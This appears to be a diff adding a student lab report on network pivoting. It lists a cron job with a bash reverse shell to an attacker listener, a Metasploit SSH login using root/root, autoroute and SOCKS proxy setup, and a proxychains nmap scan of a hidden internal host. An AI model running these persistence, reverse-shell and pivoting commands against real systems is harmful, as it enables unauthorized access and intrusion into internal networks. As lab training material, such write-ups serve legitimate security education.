@@ -1,0 +1,85 @@
+====================================================
+SESSION 24: PIVOT OPERATION REPORT
+====================================================
+
+PHASE 1: PERSISTENT CRON
+
+1. Listener started on Ubuntu VM:
+
+   nc -lvnp 4444
+
+2. SSH access to Web-Server-01:
+
+   ssh root@172.50.0.10
+
+3. Cron persistence command used:
+
+   * * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.4/4444 0>&1'
+
+
+PHASE 2: METASPLOIT PIVOT
+
+1. Metasploit SSH login module used:
+
+   use auxiliary/scanner/ssh/ssh_login
+
+2. Settings used:
+
+   set RHOSTS 172.50.0.10
+   set USERNAME root
+   set PASSWORD root
+   run
+
+3. Route added to hidden network:
+
+   run autoroute -s 10.0.9.0/24
+
+4. SOCKS proxy module used:
+
+   use auxiliary/server/socks_proxy
+
+5. SOCKS proxy settings:
+
+   set SRVPORT 1080
+   set VERSION 4a
+   run
+
+
+PROXYCHAINS CONFIGURATION
+
+1. Proxychains config file reviewed:
+
+   /etc/proxychains4.conf
+
+2. Proxy list configured as:
+
+   socks4 127.0.0.1 1080
+
+3. Scan command used:
+
+   proxychains nmap -sT -Pn 10.0.9.50
+
+
+FINAL RESULT
+
+1. Hidden target scanned:
+
+   10.0.9.50
+
+2. Nmap result showed:
+
+   Nmap scan report for 10.0.9.50
+   Host is up
+
+3. Screenshot artifact:
+
+   pivot_success.png
+
+
+SUMMARY
+
+This lab showed how to use a compromised web server as a pivot
+point to reach a hidden internal host. Metasploit was used to
+create the route and SOCKS proxy. Proxychains was used with Nmap
+to scan the hidden system through the tunnel.
+====================================================
